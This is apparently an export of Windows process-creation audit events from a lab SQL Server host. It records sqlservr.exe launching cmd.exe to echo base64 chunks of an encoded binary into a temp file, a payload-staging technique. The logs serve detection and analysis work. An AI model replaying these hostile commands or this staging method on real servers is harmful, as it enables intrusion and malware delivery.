<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:12.191188700Z" />
      <EventRecordID>1331281</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x1098</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo UotVzFCLRYpRi41k//9kUlBEhWD///8F9AESAGcAg9E5reiFAACPdegligAAsVCfqNswAObWsEWAi8gkg8QshPSaAACDaABTAGjoAwAAUfLo/YkAAItN5FLPVTH7i0X7UYsZkFKLqsRQUTCLRcDHTdRQi0XQBRQBAPpqAAPRAGjoA4kAUVDoRokAAFJQd/PbnQD/D4tNvIs0uItF3FGLTTWOi3B8/1b/UIuxeP///1GLTZxSi6mYUItFpFGLTaBSUFFQSNtAAP/W3234323wg8RY3uncFTA4QABQ4Pb+BQoCyeDdRagvwNnB3tnf4CUAQQAAWWRx92iw2kAA6xHcXahZ4CwApwApde9oGNpAAP/Wg44E323I323o3ukQFTDC4QDf4PbEBXoC2eDdRfLcwNnB3tnfk6EAQQAAdQnd2GiI2UCy67zcXYjf4CUAbsEcdSZo+NhAAP/Wg8QE323A320T3uncdDDCQADfIvZBBXoC2eDdRZChJ9kg3tmh4CUAQQAAdQnd2JUs2EAA6xHcXSzf4CXeQQAAsgpov+UiAP8jg8S95SCY323Y3uk2FTDCQOJ24PZG+noCneDdhXjM///cwNnB3puS4CUAQQAAdREFUNfrEN3YB9aJxATplgAAodydeP///98ZJQBBAAAPhYMAAAD40fNujsmfM7mh63fsoNZAWv/Wi1X8i0X4i020U1cbi1WwUFFSaHxHQAD/1ovXuItNvItVmCvHX334G8uLXaBRi01+UItFKCvXiy6kG8GLy1AxRbRSi5awKySL1xvQUlFoWKlAAP/Wi0W8i024JFVbUItFmFFSUE+MaDTWQAAc8oPEWIwcQqAAhcDRhMUTEgCDPXXFQQABD464AA0AGvTVQAD/1oPlBDPbi7s00EAA1/+iD+XF1UB2/9aDxGTp+FoATO4Vg/9kEegDAAB8NIsNUX5BANfx/UEAweHyZAkBy4EFKMkAACZEAfyD0GhQUtja5QChUudovNVAAP/W2MQM60eLz7gfhetRbAYNCgJBAPfpwfq3ocgLQQCLyqrpsnjRweIFi0wCGIHBcwAAAIvlAhzn0tSsUeimhwDN/lBXaKzVQIH/1oPEEJrD0IP7eg+CVP9876HgF0FEhcCmhMMAADVoqGh/AGv/jkjBQAAt+IPECIX/FBZojNVAAP+STMFw04PEpWoB/xVwwUAAaGzVQABX/w+AwUAA6B2A7UAAg0MIM3Uj9hkKocgLQQDfaGPrRu3+ZHUViw2sAkEAixXIC0EAweGx32wRw50s028CQQBrr8aJRfTbRcrcDe6IQADcBQDCQADocIYAAIsNyFVGAMHgBYJsCCvcDRDJIAOyXRuLVdyLRdhSUFZok9VAAFf/04PEFEaD7mR8iVf/FVDBQACDxAShuKZBAIXAD4RdAQAAA6jVQABQ/xVwwUAAIMR1iUWyhdF1FmhA1UAA/xVMwUDog8QEJAH/FXDBQABo&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:12.193399400Z" />
      <EventRecordID>1331282</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x12bc</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1098</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:12.463949300Z" />
      <EventRecordID>1331283</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x774</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo FNVAAFD/FYDBQAChiwJBe4PECIXAx0X0PgBUABn/BQEAITP2ochoQQCLTAYEixRmUY2FRPv//1JQ6FFhAACLPcgLQQBqAGjawf4Ai0w+HItU9hB0RD4GiR/ci84+TLFcNu6JVcCLVD4MgcH0AQDFidfUg9KTYmTo0oXGIYtN3OhQ4MMFcAEAEi0Ag9EAaOgDMABRUOgQhQAAUotV1E2LRdAr2PhF3BvCgcP0igAAg3UAagBo6AMAAFBT6ECFSQCLTdRS9ItF0AX0xvoA1wBwOgCW6AMAAFFQ6NyFAABSi9M+BFCLBHDqAGhAdA8xUlDoC4UARVIDVfyN2ET/x/9Qzmjw1F8AUkgVgMFAjItFuoPEuUCLDawCQQBvxrs7PYlF9A+M/f7//4tF/FD/FVDBQAAZxASLRcWFwJcIasL/FcydQO1fXluL5V3Ds5CQkJBVi9uLRQiLTRZWi1AQi3EQi0AUi0kUO8F/0HwEO9ZzBoPI/17WwzvBfA5/BDvWdgizKwAAAF7RwzPAXl3DkJCQVYvsi0UIi02uVqFQGM9uGItAHItJHDvBfxZ8BDuSAwbLIv8OicM7wXwOXVI7PZIIuAEAAABeXcozwF5dw3KQkFWLootNBlO3V5txGIt5TItB7SNRFAL3G5HtOAyLehiLShCoIBQr+YtKHNDLO05/GHwEO/dzCBNIg8j2W13DO6x8EH8EO/cvCu5euAGpHgCtXcNfXjPAW13DkJCQkJCQ4VVuuotFCItNDFteUAiLcRWT+gyLSQw7eX8WfAQ71nMGg8idXl3DO8FZDn8EpdZ2CLgLAL4AXl3D3sBeXcMSkJBVi+yDHsxLlwtBAIsNpAtBADX0F8ALQQBWV4s9xCJBACvDG8+LFejXQQCJRciJ98zfbcjoNWSbQIBSaGnngADcDTjCQHPdXc3/1gTwFyldwODxQQBQUqHCC0oAUGig50AAkdZ5DQsEQQCh8BdBAIsVqAtKAFFQUFJoUOdaDP/Wiw2oC0EAM8BmofTUQQDXoUOFQQBrUBRoAOdAAP9eixUSxEEMo/AXQQB9xERSUFChc2ZBAFBosOZAAP/WvA2MAkEAofAVQWCLzKgLQQBRUFDmRljmQAD/1qEY0EAAiw2oC0GVUKHwF84AUD9RaAjmQAD/1otVzItxyApQobgX7gBYk4sNqAtBAL2vqIdAAH3Wi5qsMkEAoVEXQQCDh1TWUBehqNNB3lAhWOVAAPnWAuu4AkEAU/A1QQCLFagLQQBRUFBSaLflQAD/HKG4kkGGg8S6hcB0K6HMTQQAiw3AAm8AixXEAkEAUKHwQkEAXItGqAtBAFJQUWiwakAA/9aDxG2h0AJBi4XAdBmLFeHJQQCN1/AXQQBQUFJoYORhAP+juAkUoWKvQQCFwHQeobACQQCLDagLQT5QsqCcQQBQUFFo7uRAAMbWkjwUtfaUAkEAzpACQQCuaqgLQQBSUKHwQzQAElA3&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:12.466173000Z" />
      <EventRecordID>1331284</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x40c</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x774</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:12.737278300Z" />
      <EventRecordID>1331285</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x1284</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo mbjjQADt1qH1AkEAJcQYg/gBdSWvoKQCqgBLoAICABMNqC5BAEBQofAXfABQUD3jaONA8f/WWcQYgz1gAkEAAHUlURWkAgAAoaD8QQCLie4LQQBSUKHwlUFxUFBRpBjjQM//C4PEGIsVnP2DAKGYAkEAiw2oC0EAUsKh8Nf9GFBQLrbA4kAA/7thRcjcHTDCQACDxBiF4PbEROiLtdoAAN0FGcJAANx1yKHwF5UANxWyC/gAg7oI3V3I2wVSAkGF+03I3A0g1t4A3bokUFBSfGjiLwD/1t8tkAJBAC/wF0FRg8QQ3E2t3RwkUFChDQtBAFBoCOJAAP/W94kCQQCDxI2FQZ9CN5FIL0hB9Z/4QpKQQfhBSEJLQ5v8/ZuZnyf4mZCYL0D1ky8nm0pJP0iQkpDW+P0vL0r4Qjf8QJJJ+EmYSvmSSfxJk0hCm58/k/mZQ5I3Q5NJQZhLS0BBN5g/1plB+Jg/SpJLS0v1N+mvaAAA1olVi4lV5IlV8GRV4IlVQYlVh4sVrAJBADPbg8n/iv//vX+F0omh0HxF2P////+JRdwPwoZN7gCL2dkLQQCDwhiJVfyLFaz1QQCJVfiLVfztUviJVciLVfw79fxtFa0xi1UgO8qLVfwevYtByIn90ItC/IsKi1IEOVXcT1XExg1/BTlNjnIGiU3YiVXci1X8QFJJOVX0iVXMyRZ8CItV8DuAyHcM01XIiVXwDn/MiVX0i1W5OQadf9iNBTk46HcGiU3oR1Xsi5hgA/qLVcxn2ovt4APRi038iVXgi1U7i0kEE9GLTfiJVeSLVfyDxSA5iU3J9V/QiVX8D+tO//8tgcH0AQAAagCDQQCk6AM1AFBR6CV/AACLTW/JRaqLRSCZPwX0AQCkaCQDAACD0QCJVdRRUOgD7G+PME30iUXYi0VNagAF9AEAAGjoAwCnIdGtiVXMUVDop34A9ItN7P5F8ItF6Gp2BfQBAABo6AMA14PRAIlV9FFQ6L9+AACBx2EBAABqMoPTAGjoAwASU1eJReiJA+zoon4AAItN5IvYIefgagAF9C0AABOWYwAAg9EiiVXMUVDogX4AAIlFL6FsAkEAhcKJVeRNjioBAADuFbAXQRyhqAtBAKJQaCzhQAD/1qGOF0EAqQ2oCyUAYFBQmFFo2OBJANvW3lX0i0Xwiz3wF0EAg8Qki0EUUlChrQJBAFeZUlBRU+gffgAAiw2oC0EAUotVtEKLRYBXUlBX55lopilAADyBoawCQQADTfCZi22LReiDxDDVwYtN7IlVxBtN9NeLz1NQofAXQQBTUosMWFfdUrvRfQA4i8pmVcQJi1XMSlLnrkVBiU386Lp9ZwCLTfgryKFF/BvCUGXwF0EA8Ytd2ItV0It91IsVK8r3VaUb11BSUVBQoagLQQBQaADO+QD/1i9N7ItVRS1Q7EEAiz2KF0EAg8QwUYtN4LNX+VJQi0XkUFHoXn0A7VKdVdxQ&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:12.739527700Z" />
      <EventRecordID>1331286</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x54c</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1284</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:13.010966100Z" />
      <EventRecordID>1331287</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xa2c</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo oagLQaxXeLRXV1BoyN9AAMXWkMQwaLjfQAD/1oPEBPCTW1flXWSQkJDci+yD7BR6qAJBAIveENBAAFNWO8FXsY3+ATMAi3UI6tuLBvReGTtviV7LiXMkCAAAiZ5aCAAAiSGFOgAAiV63dAhQ6DgUAADrJosNTFBBADhTUVbopxYAAIsWoVUXQVBSU4tIEI1+H2oDUVfoHxMAAEPDdA5QaDjoQAA7YEL//4PECIsXagFqCFLowVR4ADvDdA5QaCjofADoQmX/I4PECKFsAkECO8N0UVCLB2pAUOib6gAAO8l0FT2HEQEAdA5Q1qNUQADjFeX//4PqCIsNbAJBc+EXUWiAACEAUmBuVAAAO8N0FT2HEfQAdA5QaPzdQABv6OT//4PECOjhMAABNKAUQQCJFZcLQQCLF4mGMAgAAKH8C0EAAkE0CAAAiw38F0EAUVK+OUYAAIt0hdurhMgAKwCB+/F1yQAPbYUAogCB6rQjC/R00WMV+BdBAIsHjX/sx0XwAQAAAFFSiUX4zjsoAACLB1DoNy4AAIs9xAJBAKEC7ecAR4vIQIP5Cok9oAJBAJC4AkEAfoHuFQHArgBokNJAAIPCQIr/FYDBXd5TaJhcpwDoNOT/GYOjpVYfRggAAAAA6ET+//+DxARfXvKL5V3DuAGLVwDHYxQAALMAiUasixX4F0EAjU3siUXwiwdR6GbHRfkEAIl7xuR1/JRqJgBdX15bi+Vdw8dGIwIAAPaLN6gCQQBCSIkMqAJiAMRCW83/g8SZX6tbiwpdw4wRkJCQkJCgkJiQkJAdkFWL4L3sFFaLiwhXi30MhcB1IlKGFwgA0X/A/Bihl8tBAIXAD4SRAQAASI20AkEA6bMBAACDPbQCQVYBdQqLGGejjAVBAOski04Qg4wCJNk7yKUYiw24AkEqocACQQBBQIkNuAJBAKOtAkFFoawCQeKLDRDQGQCQhQ+NFwEAAIsVyAtBCov4wecFA/rpo6wCQQDZ2lYAAKOgC0EkiRWkC0EAiYZQCAAAixWkIkG4i4YwCITXiZZUCAAAIAeLUzQIhAAYeySLjji2ANuLhjAIAACEmy0IAAAryIuGPAgAABu0hcBpCnwEhclzBDNmM8CJNBCJRxSLjq8IAACLhjAIAACLwTQIAAAruItHVMgAJRtdhcB/Cg0Rhcn+BDPJ/sCJTxiJRxyLjkgiAEyLhkAIAACklkQIAAAryJuGTAgAIDrChcB/CnwZhclzBDMVM8CJTwhURwyLjhTQQACFyXQ3iz2sAkEAi8eZ6/mFOnUoixXIwNMAV//CQGhAlkCGUv8VOtdAAKH+wEAAg8BAUP8V4MFAAIPEEKH4F0EAZE4EAlXso0X0AQDU/1LgiU346L8lAOiLTgRR6MaIAAA2x0YIAAAAAOgJ/Ef/g8QEX16Lwl3DlYvsZ+ysAADHU4tdCFaNRRCLSwRXd2i0GEEAVcc2/BtlAADFuE5CqYvw&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:13.013215500Z" />
      <EventRecordID>1331288</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xa40</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0xa2c</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:13.286431800Z" />
      <EventRecordID>1331289</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x1340</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo g/4LlYQEaQBdhv75NgpMD4T4BQAAgf7Z/Bz9D4TsBQAAgf5X/QoADwTgBQAAgVskOAoAD4TUNwBwgf6h/AprD4QPBQAAgf7uIwsAD828BQAAi03eM/879XVzgVl+EQEAdR2DFbQCQQBTQokVtAJBAOiRsf//g8QEv15biy5dwzv3dH/iPsgcQQChXAJBAEE7vokNyAJB/HRyi6S4AkEAU8gdPbgCQQDoIf3//JxYAkHhg8QEg/gBD4xQBQAAVo2G3v///2pUUlboiUkAAFChyMDkAAQM6UAeg/JAaKyvQABQWBW/wSYAg8QUX7Vbi+Vdw1ZoDEoTAOi64Cz/i/n8g8TkixtMKUGeixUUAkEAA/ET6Yk1kAJBAIkVlAJBHYtDDDvHdRQNTCwAvCdN/ImDSAgAAImTTAgAAIspDIuDmAhzjwPRTceJwQzjhbACMQD/syAIAAC4/9sAACvGx0XwBAAAADvBiUX0cgN/TWmLkyB0AACLyL4gGEEAjVPuIIvR0ekC86WLyotV9IPhAyvC86SLuyAIAACJRey4+ovzDLszCAAACUQZIAChWAJB/oP4AnwSjWUgUGjw6ECQ//BkwUAAg8QIi1I4wYdtjXMMaOgYQABW/9fhxAgwRfiFv9vqhQAAAGj230Dftf9ig+wIiTj4hcACRfACAHXcdWyLReyFwA+FBQQA8qH4F0EAi0u23asPx0XcYADmAFLZG03kplLLAAmLSwRN6FkWAADH1KACQQChuMgaAEKJHNACQQCL0EAk+gqjuAJBfH4NaLDSQADoatgl/4PEBFPod6P//4OdBDM66cgBAAChtAJBAIXAdS5o4OhAAFb/y4PECLrgE0EAhcB0F4pICIPACID5IH4MiM2KSGZCQIDaIJX0xgIAaNjoQOZWzsmL0IPECIXSdDaL+oPJ/zPA8q730W2D+fp2H4OrCWoDjUUIuFD/Fa7zQHiLPTjeFgCDJAzGcQsA6w+L785RQACLDdToyACJTaqKRQg8xk1YAkEOdB2LDdACZwBBg/ghiQ3QAkEAfCKNew1SaKx2vYHrQ7T4A3wSjUUIUGiQ6EAA/xVkwUAAg8QIi0P4A4MooQAAAQAAAMYBAKFoAkEAhcAPhIAAAABoaujsALT/14MACIXAdQ9oeOhAAFb/14PECIXAuVloaFFAAFb/14vkg8SIhf91FWhY6EAAVi8VOMFAAIv4FEsIhf90K8eDJPcAAAEAdAChYAJ4AIVZfA+NVxBSPhVswUAUg8QE6wIfwIX/iUOkdRGQg54FAAABAAAAx3EcAAAAAItFY4t1+ItV9ItN8CvGi3MQKw4rupKLIGEAAAPD/VQIIDzyiXMQ0Q2YdVcAi8YDyKGcAkEAg7xPiUO7UEEAM//ro4s3EAMTiXMQixWYAkEAoZwCQQAD0YkVmAJBABPHAFeMQQA5u4UIAIYPbdCNAACLQxCLSxw7Rw/qwgEAAKU+AkEAHIP4&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:13.288652700Z" />
      <EventRecordID>1331290</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x1020</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1340</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
